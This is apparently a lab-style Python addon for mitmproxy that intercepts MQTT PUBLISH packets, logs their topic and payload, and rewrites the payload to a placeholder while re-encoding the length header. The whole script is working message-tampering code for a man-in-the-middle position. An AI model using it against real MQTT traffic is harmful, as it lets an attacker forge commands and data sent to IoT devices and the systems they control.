from mitmproxy import tcp

def decode_remaining_length(data, offset):
    multiplier = 1
    value = 0
    bytes_used = 0
    while True:
        encoded_byte = data[offset]
        value += (encoded_byte & 127) * multiplier
        offset += 1
        bytes_used += 1
        if (encoded_byte & 128) == 0:
            break
        multiplier *= 128
    return value, bytes_used

def tcp_message(flow: tcp.TCPFlow):
    data = flow.messages[-1].content
    try:
        if data and data[0] & 0xF0 == 0x30:  # 0x30 = PUBLISH
            print("[+] Detected MQTT PUBLISH")

            # Decodificar Remaining Length (2do byte en adelante)
            remaining_length, len_len = decode_remaining_length(data, 1)

            # Índices
            fixed_header_len = 1 + len_len
            topic_len = int.from_bytes(data[fixed_header_len:fixed_header_len+2], "big")
            topic_start = fixed_header_len + 2
            topic_end = topic_start + topic_len
            payload_start = topic_end
            payload = data[payload_start:]

            print(f"[+] Topic: {data[topic_start:topic_end].decode()}")
            print(f"[+] Payload original: {payload}")

            # Modificar payload
            new_payload = b"MODIFICADO"

            # Recalcular remaining length
            new_remaining_length = 2 + topic_len + len(new_payload)
            new_remaining_bytes = bytearray()
            x = new_remaining_length
            while True:
                byte = x % 128
                x //= 128
                if x > 0:
                    byte |= 128
                new_remaining_bytes.append(byte)
                if x == 0:
                    break

            # Reconstruir el mensaje MQTT
            fixed_header = bytes([data[0]]) + bytes(new_remaining_bytes)
            topic_part = data[fixed_header_len:payload_start]
            new_msg = fixed_header + topic_part + new_payload

            flow.messages[-1].content = new_msg
            print(f"[+] Payload modificado: {new_payload}")

    except Exception as e:
        print(f"[!] Error modificando MQTT PUBLISH: {e}")
